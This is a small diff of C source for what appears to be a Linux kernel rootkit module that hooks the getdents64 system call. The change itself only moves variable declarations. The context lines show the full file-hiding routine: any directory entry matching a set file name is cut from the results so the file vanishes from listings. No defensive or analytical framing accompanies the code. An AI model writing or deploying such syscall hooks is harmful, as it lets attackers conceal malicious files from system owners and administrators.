@@ -27,8 +27,12 @@ dirp: directory entry struct pointer
 curr: current dirp
 next: next    dirp
 */
-  int nob = getdents64_original(fd, dirp, count);
-  struct linux_dirent64 *curr = dirp;
+  int nob;
+  struct linux_dirent64 *curr;
+  char *next;
+
+  nob = getdents64_original(fd, dirp, count);
+  curr = dirp;
 
   int i = 0;
   while(i < nob) {
@@ -38,7 +42,7 @@ next: next    dirp
 
     if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       printk("🍺 Found the file\n");
-      char *next = (char*)curr + size;
+      next = (char*)curr + size;
       int len = (uintptr_t)dirp + nob - (uintptr_t)next;
       memmove(curr, next, len);
       nob -= size;
